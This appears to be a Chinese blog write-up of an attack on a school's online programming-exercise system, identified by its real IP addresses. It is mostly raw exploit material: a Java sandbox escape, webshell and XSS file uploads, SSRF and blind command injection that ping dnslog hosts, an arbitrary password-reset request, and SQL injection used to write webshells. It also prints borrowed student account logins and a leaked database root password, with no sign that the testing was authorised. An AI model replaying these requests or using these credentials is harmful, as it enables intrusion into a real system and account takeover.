+<h4 id="沙箱逃逸-gt-命令执行"><a href="#沙箱逃逸-gt-命令执行" class="headerlink" title="沙箱逃逸-&gt;命令执行"></a>沙箱逃逸-&gt;命令执行</h4><p><a target="_blank" rel="noopener" href="http://222.27.166.246,测试c,c++,java,python等是否存在沙箱逃逸导致rce/">http://222.27.166.246，测试c，c++，java，python等是否存在沙箱逃逸导致rce</a></p>
+<p>学弟可爱捏，借你账户一用</p>
+<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">2022212805		C语言</span><br><span class="line">123456</span><br><span class="line"></span><br><span class="line">2021214809		JAVA</span><br><span class="line">123456</span><br></pre></td></tr></table></figure>
+
+<p><a target="_blank" rel="noopener" href="http://222.27.166.246/studentExercise/index?currentClassId=728#7988_exercise_1065_solId">http://222.27.166.246/studentExercise/index?currentClassId=728#7988_exercise_1065_solId</a></p>
+<p><img src="https://img14.360buyimg.com/ddimg/jfs/t1/89814/7/35261/44459/647b08deFd8652702/69b62f40a7037b33.jpg" alt="image.png"></p>
+<p>经测试，C语言的沙箱逃逸失败</p>
+<h5 id="JAVA沙箱逃逸"><a href="#JAVA沙箱逃逸" class="headerlink" title="JAVA沙箱逃逸"></a>JAVA沙箱逃逸</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://222.27.166.246/studentExercise/index?currentClassId=736#363_exercise_1082_solId</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://img11.360buyimg.com/ddimg/jfs/t1/202122/37/34668/38055/647b0fbcF3be727e7/c102605b9c4376ec.jpg" alt="image.png"></p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"><span class="keyword">import</span> java.io.InputStream;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Main</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="type">ProcessBuilder</span> <span class="variable">pb</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ProcessBuilder</span>(<span class="string">&quot;pwd&quot;</span>);</span><br><span class="line">            <span class="type">Process</span> <span class="variable">p</span> <span class="operator">=</span> pb.start();</span><br><span class="line">            <span class="type">InputStream</span> <span class="variable">is</span> <span class="operator">=</span> p.getInputStream();</span><br><span class="line">            <span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line">            <span class="keyword">while</span> ((i = is.read()) != -<span class="number">1</span>) &#123;</span><br><span class="line">                System.out.print((<span class="type">char</span>)i);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">catch</span> (IOException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>这里执行<code>pwd</code>没有被拦截，证明执行成功，</p>
+<p><img src="https://img12.360buyimg.com/ddimg/jfs/t1/118665/24/36400/43475/647b0fc5Fb2761ee3/c4e09042ac347149.jpg" alt="image.png"></p>
+<p>如果被拦截有两种情况：</p>
+<p>1）敏感关键字</p>
+<p>例如我执行<code>ifconfig</code>，<code>whoami</code>，<code>ls</code>等，但是像<code>pwd</code>，<code>id</code>就没事，但是我之后再尝试发现whoami也不拦截了，我猜测可能是我请求过快了？</p>
+<p><img src="https://img10.360buyimg.com/ddimg/jfs/t1/111519/10/39206/56485/647b11b4F02c714f6/85d08649793cd949.jpg" alt="image.png"></p>
+<p>如下正常</p>
+<p><img src="https://img10.360buyimg.com/ddimg/jfs/t1/114588/30/35523/60542/647b113eFc4442d2e/ba10330a065bfb31.jpg" alt="image.png"></p>
+<p>2）语句写错了</p>
+<p>例如我这里执行了一个错误的命令<code>lpwd</code>，被拦截了</p>
+<p><img src="https://img13.360buyimg.com/ddimg/jfs/t1/132861/27/37537/59928/647b1083F6964de83/23b5b532054c5d53.jpg" alt="image.png"></p>
+<h4 id="后台文件上传"><a href="#后台文件上传" class="headerlink" title="后台文件上传"></a>后台文件上传</h4><p>上我的过污点跟踪的免杀马</p>
+<p><img src="https://img12.360buyimg.com/ddimg/jfs/t1/146592/26/34945/47273/647b0484F2e4b9934/67f9bc6d8e3c91fc.jpg" alt="image.png"></p>
+<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/studentExercise/iframeFile</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>222.27.166.246</span><br><span class="line"><span class="attribute">User-Agent</span><span class="punctuation">: </span>Mozilla/5.0 (Windows NT 6.2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/101.0.4951.54 Safari/537.36</span><br><span class="line"><span class="attribute">Accept</span><span class="punctuation">: </span>text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8</span><br><span class="line"><span class="attribute">Accept-Language</span><span class="punctuation">: </span>zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2</span><br><span class="line"><span class="attribute">Accept-Encoding</span><span class="punctuation">: </span>gzip, deflate</span><br><span class="line"><span class="attribute">Content-Type</span><span class="punctuation">: </span>multipart/form-data; boundary=---------------------------376203231024066389602534646821</span><br><span class="line"><span class="attribute">Content-Length</span><span class="punctuation">: </span>2105</span><br><span class="line"><span class="attribute">Connection</span><span class="punctuation">: </span>close</span><br><span class="line"><span class="attribute">Cookie</span><span class="punctuation">: </span>PHPSESSID=bgaf8odr35jsne3lbga4remtb3</span><br><span class="line"><span class="attribute">Upgrade-Insecure-Requests</span><span class="punctuation">: </span>1</span><br><span class="line"></span><br><span class="line"><span class="language-pgsql"><span class="comment">-----------------------------376203231024066389602534646821</span></span></span><br><span class="line"><span class="language-pgsql">Content-Disposition: form-data; <span class="type">name</span>=&quot;fileToUpload&quot;; filename=&quot;test.phtml&quot;</span></span><br><span class="line"><span class="language-pgsql">Content-<span class="keyword">Type</span>: application/msword</span></span><br><span class="line"><span class="language-pgsql"></span></span><br><span class="line"><span class="language-pgsql"><span class="number">123</span></span></span><br><span class="line"><span class="language-pgsql"><span class="comment">-----------------------------376203231024066389602534646821</span></span></span><br><span class="line"><span class="language-pgsql">Content-Disposition: form-data; <span class="type">name</span>=&quot;myexercise_id&quot;</span></span><br><span class="line"><span class="language-pgsql"></span></span><br><span class="line"><span class="language-pgsql"><span class="number">5177</span></span></span><br><span class="line"><span class="language-pgsql"><span class="comment">-----------------------------376203231024066389602534646821</span></span></span><br><span class="line"><span class="language-pgsql">Content-Disposition: form-data; <span class="type">name</span>=&quot;section_id&quot;</span></span><br><span class="line"><span class="language-pgsql"></span></span><br><span class="line"><span class="language-pgsql"><span class="number">17132</span></span></span><br><span class="line"><span class="language-pgsql"><span class="comment">-----------------------------376203231024066389602534646821--</span></span></span><br><span class="line"><span class="language-pgsql"></span></span><br></pre></td></tr></table></figure>
+
+<p><img src="https://img11.360buyimg.com/ddimg/jfs/t1/117660/5/37565/102066/647b040bF72d8b0e4/961f27032c93fdfc.jpg" alt="image.png"></p>
+<p><img src="https://img11.360buyimg.com/ddimg/jfs/t1/223927/38/22588/28449/647b1287F96d03ec4/788bbdb21d4f9762.jpg" alt="image.png"></p>
+<h4 id="文件上传xml打xss"><a href="#文件上传xml打xss" class="headerlink" title="文件上传xml打xss"></a>文件上传xml打xss</h4><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/assets/ueditor/php/controller.php?action=uploadfile</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>222.27.166.246</span><br><span class="line"><span class="attribute">User-Agent</span><span class="punctuation">: </span>Mozilla/5.0 (Windows NT 6.2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/101.0.4951.54 Safari/537.36</span><br><span class="line"><span class="attribute">Accept</span><span class="punctuation">: </span>text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8</span><br><span class="line"><span class="attribute">Accept-Language</span><span class="punctuation">: </span>zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2</span><br><span class="line"><span class="attribute">Accept-Encoding</span><span class="punctuation">: </span>gzip, deflate</span><br><span class="line"><span class="attribute">Content-Type</span><span class="punctuation">: </span>multipart/form-data; boundary=---------------------------135931813482700382992218019</span><br><span class="line"><span class="attribute">Content-Length</span><span class="punctuation">: </span>52125</span><br><span class="line"><span class="attribute">Origin</span><span class="punctuation">: </span>http://222.27.166.246</span><br><span class="line"><span class="attribute">Connection</span><span class="punctuation">: </span>close</span><br><span class="line"><span class="attribute">Cookie</span><span class="punctuation">: </span>PHPSESSID=pkqvhojlqj52bmqbjmoq8ipjd2; had_myset_current=8</span><br><span class="line"><span class="attribute">Upgrade-Insecure-Requests</span><span class="punctuation">: </span>1</span><br><span class="line"><span class="attribute">sec-ch-ua-platform</span><span class="punctuation">: </span>&quot;Windows&quot;</span><br><span class="line"><span class="attribute">sec-ch-ua</span><span class="punctuation">: </span>&quot;Google Chrome&quot;;v=&quot;101&quot;, &quot;Chromium&quot;;v=&quot;101&quot;, &quot;Not=A?Brand&quot;;v=&quot;24&quot;</span><br><span class="line"><span class="attribute">sec-ch-ua-mobile</span><span class="punctuation">: </span>?0</span><br><span class="line"></span><br><span class="line"><span class="language-xquery">-----------------------------<span class="number">135931813482700382992218019</span></span></span><br><span class="line"><span class="language-xquery">Content-Disposition: form-data;<span class="built_in"> name</span>=<span class="string">&quot;upfile&quot;</span>; filename=<span class="string">&quot;123.xml&quot;</span></span></span><br><span class="line"><span class="language-xquery">Content-Type: image/jpeg</span></span><br><span class="line"><span class="language-xquery"></span></span><br><span class="line"><span class="language-xquery"><span class="language-xml"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span></span></span><br><span class="line"><span class="language-xml"><span class="language-xquery"></span><span class="language-xml"><span class="tag">&lt;<span class="name">head</span>&gt;</span><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><span class="language-xml"></span></span></span><br><span class="line"><span class="language-xml"><span class="language-xquery"></span><span class="language-xml"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span></span></span><br><span class="line"><span class="language-xml"><span class="language-xquery"></span><span class="language-xml"><span class="tag">&lt;<span class="name">something:script</span> <span class="attr">xmlns:something</span>=<span class="string">&quot;http://www.w3.org/1999/xhtml&quot;</span>&gt;</span></span></span></span><br><span class="line"><span class="language-xml"><span class="language-xquery">alert(&quot;test&quot;);</span></span></span><br><span class="line"><span class="language-xml"><span class="language-xquery"><span class="tag">&lt;/<span class="name">something:script</span>&gt;</span></span><span class="language-xml"></span></span></span><br><span class="line"><span class="language-xml"><span class="language-xquery"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><span class="language-xml"></span></span></span><br><span class="line"><span class="language-xml"><span class="language-xquery"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span></span></span><br><span class="line"><span class="language-xquery">-----------------------------<span class="number">135931813482700382992218019</span>--</span></span><br></pre></td></tr></table></figure>
+
+
+
+
+
+
+
+<h4 id="SSRF"><a href="#SSRF" class="headerlink" title="SSRF"></a>SSRF</h4><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/assets/ueditor/php/controller.php?action=uploadfile</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>xxxxxxxxxx</span><br><span class="line"><span class="attribute">Cookie</span><span class="punctuation">: </span>AnnYouDevBaseAdfv3dpms_BFESS=</span><br><span class="line"><span class="attribute">User-Agent</span><span class="punctuation">: </span>Mozilla/5.0 (Windows NT 6.2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/101.0.4951.54 Safari/537.36</span><br><span class="line"><span class="attribute">Accept</span><span class="punctuation">: </span>text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8</span><br><span class="line"><span class="attribute">Accept-Language</span><span class="punctuation">: </span>zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2</span><br><span class="line"><span class="attribute">Accept-Encoding</span><span class="punctuation">: </span>gzip, deflate</span><br><span class="line"><span class="attribute">Content-Type</span><span class="punctuation">: </span>application/x-www-form-urlencoded</span><br><span class="line"><span class="attribute">Content-Length</span><span class="punctuation">: </span>66</span><br><span class="line"><span class="attribute">Origin</span><span class="punctuation">: </span>null</span><br><span class="line"><span class="attribute">Upgrade-Insecure-Requests</span><span class="punctuation">: </span>1</span><br><span class="line"><span class="attribute">Te</span><span class="punctuation">: </span>trailers</span><br><span class="line"><span class="attribute">Connection</span><span class="punctuation">: </span>close</span><br><span class="line"></span><br><span class="line"><span class="language-mel"><span class="keyword">source</span>%5B%5D=http%3A%2F%2Fdnslog%2Fax.jpg%3F.jpg</span></span><br></pre></td></tr></table></figure>
+
+
+
+
+
+<p>任意密码重置</p>
+<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/teacherStudent/19060</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>222.27.166.246</span><br><span class="line"><span class="attribute">User-Agent</span><span class="punctuation">: </span>Mozilla/5.0 (Windows NT 6.2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/101.0.4951.54 Safari/537.36</span><br><span class="line"><span class="attribute">Accept</span><span class="punctuation">: </span>text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8</span><br><span class="line"><span class="attribute">Accept-Language</span><span class="punctuation">: </span>zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2</span><br><span class="line"><span class="attribute">Accept-Encoding</span><span class="punctuation">: </span>gzip, deflate</span><br><span class="line"><span class="attribute">Referer</span><span class="punctuation">: </span>http://222.27.166.246/teacherStudent/19060</span><br><span class="line"><span class="attribute">Content-Type</span><span class="punctuation">: </span>multipart/form-data; boundary=---------------------------164612657221430012782995974555</span><br><span class="line"><span class="attribute">Content-Length</span><span class="punctuation">: </span>193</span><br><span class="line"><span class="attribute">Origin</span><span class="punctuation">: </span>http://222.27.166.246</span><br><span class="line"><span class="attribute">Connection</span><span class="punctuation">: </span>close</span><br><span class="line"><span class="attribute">Cookie</span><span class="punctuation">: </span>my_modle_id=teacherStudent; my_action_id=index; param_3=0; PHPSESSID=lbv1052r8lj4af848hmc5q7nb2; had_myset_current=10</span><br><span class="line"><span class="attribute">Upgrade-Insecure-Requests</span><span class="punctuation">: </span>1</span><br><span class="line"><span class="attribute">sec-ch-ua-platform</span><span class="punctuation">: </span>&quot;Windows&quot;</span><br><span class="line"><span class="attribute">sec-ch-ua</span><span class="punctuation">: </span>&quot;Google Chrome&quot;;v=&quot;101&quot;, &quot;Chromium&quot;;v=&quot;101&quot;, &quot;Not=A?Brand&quot;;v=&quot;24&quot;</span><br><span class="line"><span class="attribute">sec-ch-ua-mobile</span><span class="punctuation">: </span>?0</span><br><span class="line"></span><br><span class="line"><span class="language-haskell"><span class="comment">-----------------------------164612657221430012782995974555</span></span></span><br><span class="line"><span class="language-haskell"><span class="type">Content</span>-<span class="type">Disposition</span>: form-<span class="class"><span class="keyword">data</span>; name=&quot;<span class="type">DataForm</span>[password]&quot;</span></span></span><br><span class="line"><span class="language-haskell"></span></span><br><span class="line"><span class="language-haskell"><span class="number">123456</span></span></span><br><span class="line"><span class="language-haskell"><span class="comment">-----------------------------164612657221430012782995974555--</span></span></span><br><span class="line"><span class="language-haskell"></span></span><br></pre></td></tr></table></figure>
+
+
+
+
+
+<h4 id="无回显RCE"><a href="#无回显RCE" class="headerlink" title="无回显RCE"></a>无回显RCE</h4><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://118.190.104.186/assets/test_c/test.php?softtype=%26ping 1k2cze.dnslog.cn</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://img12.360buyimg.com/ddimg/jfs/t1/145132/2/34064/44192/647b1b2dF76549bdf/60dbbf00abf88be5.jpg" alt="image.png"><br><img src="https://img12.360buyimg.com/ddimg/jfs/t1/76967/9/24597/51705/647b1b46Fe03f4e04/764e09f536bf66c6.jpg" alt="image.png"></p>
+<p><img src="https://img10.360buyimg.com/ddimg/jfs/t1/121818/35/38605/37648/647b1b57F98a1aef8/a176b65cef423623.jpg" alt="image.png"></p>
+<h4 id="phpmyadmin后台SQL写入webshell-查看任意SQL数据"><a href="#phpmyadmin后台SQL写入webshell-查看任意SQL数据" class="headerlink" title="phpmyadmin后台SQL写入webshell + 查看任意SQL数据"></a>phpmyadmin后台SQL写入webshell + 查看任意SQL数据</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">localhost</span><br><span class="line">root</span><br><span class="line">9528linike</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://img13.360buyimg.com/ddimg/jfs/t1/76755/3/25557/38619/647b2e2dF37b44de5/34fb2b67373b1dde.jpg" alt="image.png"><br><img src="https://img11.360buyimg.com/ddimg/jfs/t1/124343/9/37712/105073/647b2e4cF8f01b80c/ec5a690ab9df2571.jpg" alt="image.png"></p>
+<p>慢查询或者什么写入方式随便你，root权限直接写webshell</p>
+<p><img src="https://img12.360buyimg.com/ddimg/jfs/t1/38927/36/20308/60946/647b2e64Fc77876c1/16ce0a0b6724ba5f.jpg" alt="image.png"></p>
+<h4 id="phpmyadmin低版本一系列漏洞"><a href="#phpmyadmin低版本一系列漏洞" class="headerlink" title="phpmyadmin低版本一系列漏洞"></a>phpmyadmin低版本一系列漏洞</h4><blockquote>
+<p><a target="_blank" rel="noopener" href="https://www.cvedetails.com/vulnerability-list/vendor_id-784/product_id-1341/version_id-471830/Phpmyadmin-Phpmyadmin-3.3.9.2.html">https://www.cvedetails.com/vulnerability-list/vendor_id-784/product_id-1341/version_id-471830/Phpmyadmin-Phpmyadmin-3.3.9.2.html</a></p>
+</blockquote>
+<p>这个版本是3.3.9.2，低版本一顿洞，我就不自己找了</p>
+<p><img src="https://img12.360buyimg.com/ddimg/jfs/t1/146649/37/34500/113315/647c2985Ff0522603/2b12eef96050a274.jpg" alt="image.png"><br><img src="https://img13.360buyimg.com/ddimg/jfs/t1/216104/3/30893/290619/647c299aF9b6064b6/13b03e6b98472131.jpg" alt="image.png"></p>
+<p>主要是代码太多….而且这种老版本以后很少会遇到</p>
+<p><img src="https://img10.360buyimg.com/ddimg/jfs/t1/144476/15/37293/70692/647c29daF6a0be934/3ed02f88870e24c9.jpg" alt="image.png"></p>
+<h4 id="SQL注入-写webshell"><a href="#SQL注入-写webshell" class="headerlink" title="SQL注入-写webshell"></a>SQL注入-写webshell</h4><p><a target="_blank" rel="noopener" href="http://118.190.104.186/site/teacherApply">http://118.190.104.186/site/teacherApply</a></p>
+<p>版本小于等于5.6，root权限，直接写就可以了</p>
+<p><img src="https://img12.360buyimg.com/ddimg/jfs/t1/211207/33/33229/115676/647c2d95Fd2eb970c/34e365291462b9d5.jpg" alt="2e0015480b3f44946fd704157201077.png"><br><img src="https://img12.360buyimg.com/ddimg/jfs/t1/217073/1/31679/113779/647c2d99F3c44de63/a38abad173aa1086.jpg" alt="2df7b512d4d2274349af06394962501.png"></p>
+<h4 id="Yii-1-1-12一系列历史框架洞"><a href="#Yii-1-1-12一系列历史框架洞" class="headerlink" title="Yii 1.1.12一系列历史框架洞"></a>Yii 1.1.12一系列历史框架洞</h4><blockquote>
+<p><a target="_blank" rel="noopener" href="https://cve.mitre.org/cgi-bin/cvekey.cgi?keyword=Yii">https://cve.mitre.org/cgi-bin/cvekey.cgi?keyword=Yii</a></p>
+</blockquote>
+<p><img src="https://img12.360buyimg.com/ddimg/jfs/t1/138605/13/37686/12964/647c392eFcd681b77/973aa8ff398c60cb.jpg" alt="image.png"></p>
+<h4 id="尝试对php代码手工解混淆"><a href="#尝试对php代码手工解混淆" class="headerlink" title="尝试对php代码手工解混淆"></a>尝试对php代码手工解混淆</h4><p>我们的一个SQL注入的url是：<code>/site/ajaxCheck?field=user_id&amp;table=users&amp;value=1dasda</code>    </p>
+<p>找到对应的控制器<code>protected/controllers/SiteController.php</code></p>
+<p><img src="https://img10.360buyimg.com/ddimg/jfs/t1/109471/1/41461/43876/647c3b0eF09fa8dc3/32dabcdb3aa7f92f.jpg" alt="image.png"></p>
+<p>首先我们将这里url编码和下面的一长串加密的内容单独拿出来，因为如果直接利用js解密，会进行url解码</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$O00OO0</span>=<span class="title function_ invoke__">urldecode</span>(<span class="string">&quot;%6E1%7A%62%2F%6D%615%5C%76%740%6928%2D%70%78%75%71%79%2A6%6C%72%6B%64%679%5F%65%68%63%73%77%6F4%2B%6637%6A&quot;</span>);</span><br></pre></td></tr></table></figure>
+
+<p>单独拿出来</p>
+<p>然后js解密，替换<a target="_blank" rel="noopener" href="https://www.sojson.com/jsjiemi.html%EF%BC%8C%E5%88%A9%E7%94%A8echo%E6%9D%A5%E5%B1%95%E7%A4%BA%E7%BB%93%E6%9E%9C">https://www.sojson.com/jsjiemi.html，利用echo来展示结果</a></p>
+<p><img src="https://img10.360buyimg.com/ddimg/jfs/t1/147169/18/37321/21063/647c42a4Fbd4deebe/d002cd85e7678686.jpg" alt="image.png"></p>
+<p>可知，eval所执行的是base64加密之后的，我们长度后面进行参数替换，然后base64解密</p>
+<p><img src="https://img13.360buyimg.com/ddimg/jfs/t1/72682/18/20503/359735/647c4361F3deecc46/f9debbb0356ad76d.jpg" alt="image.png"></p>
+<p>最终解密，查看网页源代码，得到已经经过换行处理的源代码，我们SQL注入的ajaxCheck方法在这里</p>
+<p><img src="https://img11.360buyimg.com/ddimg/jfs/t1/219915/24/30461/78576/647c4da5F60b6ae9c/d595ba14641870e1.jpg" alt="image.png"></p>
+<p><a target="_blank" rel="noopener" href="https://www.toolfk.com/tools/convert-php.html">https://www.toolfk.com/tools/convert-php.html</a></p>
+<p>或者你也可以直接用这个网站…..我突然发现这个是一样的</p>
+<h5 id="SQL注入-2"><a href="#SQL注入-2" class="headerlink" title="SQL注入_2"></a>SQL注入_2</h5><p><code>protected/controllers/TeacherTsSettingController.php</code></p>
+<p>需要教师权限</p>
+<p>id，name，注入* 2</p>
+<p><img src="https://img12.360buyimg.com/ddimg/jfs/t1/139075/3/32715/70197/647c615fF736a66d4/3872c74650a2fc49.jpg" alt="image.png"></p>
+<p>…</p>
+<p>后面洞太多就不审了，代码多的看的头皮发麻，花了三天都没看完（悲），总之这套系统可以换了</p>
+
+  </div>
+</article>
+
+
+
+        
+          <div id="footer-post-container">
+  <div id="footer-post">
+
+    <div id="nav-footer" style="display: none">
+      <ul>
+         
+          <li><a href="/">Home</a></li>
+         
+          <li><a href="/about/">About</a></li>
+         
+          <li><a href="/archives/">Writing</a></li>
+         
+          <li><a href="/">Projects</a></li>
+        
+      </ul>
+    </div>
+
+    <div id="toc-footer" style="display: none">
+      <ol class="toc"><li class="toc-item toc-level-4"><a class="toc-link" href="#svn%E6%BA%90%E7%A0%81%E6%B3%84%E9%9C%B2"><span class="toc-number">1.</span> <span class="toc-text">svn源码泄露</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%95%B0%E6%8D%AE%E5%BA%93%E8%B4%A6%E6%88%B7%E5%AF%86%E7%A0%81%E6%B3%84%E9%9C%B2"><span class="toc-number">2.</span> <span class="toc-text">数据库账户密码泄露</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#FlexPaper1-4-5"><span class="toc-number">3.</span> <span class="toc-text">FlexPaper1.4.5</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#%E5%8F%8D%E5%B0%84XSS-2"><span class="toc-number">3.1.</span> <span class="toc-text">反射XSS * 2</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96"><span class="toc-number">3.2.</span> <span class="toc-text">文件读取</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#FlexPaper2-2-1"><span class="toc-number">4.</span> <span class="toc-text">FlexPaper2.2.1</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#%E5%8F%8D%E5%B0%84XSS"><span class="toc-number">4.1.</span> <span class="toc-text">反射XSS</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E6%97%A0%E5%9B%9E%E6%98%BE%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C-2"><span class="toc-number">4.2.</span> <span class="toc-text">无回显命令执行 * 2</span></a><ol class="toc-child"><li class="toc-item toc-level-6"><a class="toc-link" href="#%E6%97%A0%E6%B3%95%E7%BB%95%E8%BF%87%E7%9A%84%E5%8F%8D%E5%B0%84XSS"><span class="toc-number">4.2.1.</span> <span class="toc-text">无法绕过的反射XSS</span></a></li></ol></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%8F%8D%E5%B0%84XSS-%E9%9C%80%E8%A6%81%E7%99%BB%E9%99%86"><span class="toc-number">5.</span> <span class="toc-text">反射XSS-需要登陆</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2"><span class="toc-number">5.1.</span> <span class="toc-text">信息泄露</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%B2%99%E7%AE%B1%E9%80%83%E9%80%B8-gt-%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C"><span class="toc-number">6.</span> <span class="toc-text">沙箱逃逸-&gt;命令执行</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#JAVA%E6%B2%99%E7%AE%B1%E9%80%83%E9%80%B8"><span class="toc-number">6.1.</span> <span class="toc-text">JAVA沙箱逃逸</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%90%8E%E5%8F%B0%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0"><span class="toc-number">7.</span> <span class="toc-text">后台文件上传</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0xml%E6%89%93xss"><span class="toc-number">8.</span> <span class="toc-text">文件上传xml打xss</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#SSRF"><span class="toc-number">9.</span> 